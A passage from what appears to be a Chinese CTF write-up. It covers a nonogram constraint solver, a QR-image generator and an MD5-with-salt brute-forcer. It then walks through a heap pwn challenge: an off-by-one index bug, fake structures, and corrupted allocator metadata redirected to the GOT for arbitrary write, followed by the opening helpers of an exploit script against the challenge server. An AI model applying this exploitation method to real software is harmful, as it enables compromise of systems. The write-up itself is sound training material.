          return (tuples, num_states)
    #
    # check each rule by creating an   automaton and transition constraint.
    #
    def check_rule(rules, y):
          cleaned_rule = [rules[i] for i in range(len(rules)) if rules[i] >   0]
          (transition_tuples, last_state) = make_transition_tuples(cleaned_rule)
          initial_state = 1
          accepting_states = [last_state]
          solver = y[0].solver()
          solver.Add(solver.TransitionConstraint(y,
                                                 transition_tuples,
                                                 initial_state,
                                                 accepting_states))
    def main(row_rules, col_rules):
          rows = len(row_rules)
          cols = len(col_rules)
          row_rule_len = 0
          col_rule_len = 0
          for i in row_rules:
            if len(i) > row_rule_len:
                row_rule_len = len(i)
          for i in col_rules:
            if len(i) > col_rule_len:
                col_rule_len = len(i)
          # Create the solver.
          solver = pywrapcp.Solver('Nonogram')
          #
          # variables
          #
          board = {}
          for i in range(rows):
            for j in range(cols):
                board[i, j] = solver.IntVar(0, 1,   'board[%i, %i]' % (i, j))
          # board_flat = [board[i, j] for i in range(rows) for j in range(cols)]
          # Flattened board for labeling.
          # This labeling was inspired by a suggestion from
          # Pascal Van Hentenryck about my (hakank's) Comet
          # nonogram model.
          board_label = []
          if rows * row_rule_len < cols * col_rule_len:
            for i in range(rows):
                for j in range(cols):
                    board_label.append(board[i,   j])
          else:
            for j in range(cols):
                for i in range(rows):
                    board_label.append(board[i, j])
          #
          # constraints
          #
          for i in range(rows):
            check_rule(row_rules[i], [board[i, j]   for j in range(cols)])
          for j in range(cols):
            check_rule(col_rules[j], [board[i, j]   for i in range(rows)])
          #
          # solution and search
          #
          parameters = pywrapcp.DefaultPhaseParameters()
          parameters.heuristic_period = 200000
          db = solver.DefaultPhase(board_label, parameters)
          print 'before solver, wall time = ', solver.WallTime(), 'ms'
          solver.NewSearch(db)
          num_solutions = 0
          results = []
          while solver.NextSolution():
            print
            num_solutions += 1
            result = []
            for i in range(rows):
                row = [board[i, j].Value() for j   in range(cols)]
                row_pres = []
                for j in row:
                    if j == 1:
                        row_pres.append('1')
                    else:
                        row_pres.append('0')
                result.extend(row_pres)
            result = ''.join(result)
            # print '  ', ''.join(row_pres)
            # print
            # print '  ', '-' * cols
            results.append(result)
            if num_solutions == 2:
                # print '2 solutions is   enough...'
                break
          solver.EndSearch()
          # print
          # print 'num_solutions:',   num_solutions
          # print 'failures:', solver.Failures()
          # print 'branches:', solver.Branches()
          # print 'WallTime:', solver.WallTime(), 'ms'
        return results
生成二维码的解题的脚本
    from PIL import Image
    import math
    import itertools
    class BinQR:
          def __init__(self, s):
            if not isinstance(s, str):
                raise ValueError("You must   input a string")
            self.data = s.replace('r',   '').replace('n', '').replace('t', '').replace(' ', '')
            length = len(self.data)
            if self.data.count('0') +   self.data.count('1') != length:
                raise ValueError("You can   only input 1 and 0")
            self.col = int(math.sqrt(length))
            if pow(self.col, 2) != length:
                raise ValueError("You must   input a square")
                # self.data = [list(self.data[i:i   + self.col]) for i in xrange(0, length, self.col)]
            self.pic = Image.new("RGB",   (self.col, self.col))
            for i, (y, x) in   enumerate(itertools.product(*([xrange(self.col)] * 2))):
                self.pic.putpixel((x, y), (0, 0,   0) if self.data[i] == '1' else (255, 255, 255))
          def save(self, path):
            self.pic.save(path)
          def show(self, resize=10):
            if resize:
                self.pic.resize((self.col *   resize, self.col * resize)).show()
            else:
                self.pic.show()
    import hashlib
    import string
    print
    a = []
    for line in open('input2',   'r').readlines():
          md5, _, salt = line.strip().split('|')
          salt = salt.split(':')[-1]
          a.append((md5.strip(), salt.strip()))
    def get_letter(md5, salt):
          index = md5.index('?')
          for i in string.printable:
            m2 = hashlib.md5(i +   salt).hexdigest()[8:24]
            md5 = md5[:index] + m2[index] +   md5[index + 1:]
            if m2 == md5:
                return i
          raise Exception(i)
    b = []
    for md5, salt in a:
          b.append(get_letter(md5, salt))
    print ''.join(b)
**400 Pwn-1最后是爆破的**
这道题目是一个数值排序的程序，它模拟了内存的分配与释放，对于历史记录信息的内容和管理结构是用自己定义的内存分配释放进行的，主要的洞就在于，对于输入的数字序列进行修改和查询时，可以越界一个index：
查询：
修改：
在自己管理的内存部分，存储两类数据：
信息内容：
00000000 history_info_struct struc ; (sizeof=0x8)
00000000 count dd ?
00000004 number_buff dd ? ; offset
00000008 history_info_struct ends
信息管理结构：
00000000 history_manager_struct struc ; (sizeof=0x8)
00000000 info dd ? ; offset
00000004 next dd ?
00000008 history_manager_struct ends
而这两种结构在这部分内存中是连续排放的，所以越界很容易修改和查看另一种结构体的第一个int值，count或者info（属于history_info_struct类型）
这样泄露很容易，但是修改的值不太好利用，因为很多地方参数都是history_info_struct，这个结构没法直接修改，只能改掉历史记录中的信息，而不是正在使用的信息，于是去找重点地方，如下：
可以看见，在memcpy的时候，如果n为0，那么dest里面的东西会保持不变，于是利用思路如下：
构造两个假的history_info_struct，其中一个的count的值为-1，
另外一个的count为一个很大的数（0x7ffffff0）,然后利用index修改history_manager_struct结构中的info，使其指向这个假节点（count的值为-1的地方），然后控制内存使得下一个节点分配出来的刚好是count为0x7ffffff0的地方时，进行reload操作，此时alloc_mem_diy_8048B11（0）刚好能够返回大小为8的节点，而dest中的信息依然不变，其中count域却成了0x7ffffff0，这样就可以在处理update和query的时候进行大范围的查询和修改。
然而这样还是有问题，因为0x7ffffff0+heap的范围依然很小，根本达不到got表，于是考虑一个跳板，由于自定义的内存部分大小是0x10000，管理内存的控制结构却要重新malloc，而且只能是内存碎化，没法合并，而且内存的管理是按照从小到大排序，每次从前往后匹配，直到找到合适的为止。这部分内存的管理结构如下：
00000000 manager_info_struct struc ; (sizeof=0x10,)
00000000 mem_size dd ?
00000004 in_use dd ?
00000008 data_buff dd ? ; offset
0000000C next dd ? ; offset
00000010 manager_info_struct ends
通过前面的update可以修改后续heap中的manager_info_struct结构，将其置为可用，且data_buff指向got表，那么下次申请到的就是got的内容，此时就可以任意查询和修改了。
整个思路就是这样，关键得去布置内存，由于我信息泄露实现的比较早（有点多余了），导致最后到达got的时候，只是用了修改这个功能。
详细的布置方法见脚本：
    __author__ = "pxx"
    from zio import *
    from pwn import *
    import struct
    #target = "./pwn1"
    target = ("pwn.lab.seclover.com", 11111)
    def get_io(target):
           r_m = COLORED(RAW, "green")
           w_m = COLORED(RAW, "blue")
           io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
           return io
    def history(io):
           io.read_until("_CMD_$ ")
           io.writeline("history")
    def t_reload(io, t_id):
           io.read_until("_CMD_$ ")
           io.writeline("reload")
           io.read_until("Reload history ID: ")
           io.writeline(str(t_id))
    def clear(io):
           io.read_until("_CMD_$ ")
           io.writeline("clear")
    def sort(io, seq):
           io.read_until("_CMD_$ ")
           io.writeline("sort")
           io.read_until("How many numbers do you want to sort: ")
           io.writeline(str(len(seq)))
           for item in seq:
                  io.read_until("Enter a number: ")
                  io.writeline(item)
    def sort2(io, seq, count):
           io.read_until("_CMD_$ ")
           io.writeline("sort")
           io.read_until("How many numbers do you want to sort: ")
           io.writeline(str(count))
           for item in seq:
                  io.read_until("Enter a number: ")
                  io.writeline(item)
    def t_exit(io):
           io.read_until("_CMD_$ ")
           io.writeline("exit")
    def sub_query(io, index):
           io.read_until("Choose: ")
           io.writeline("1")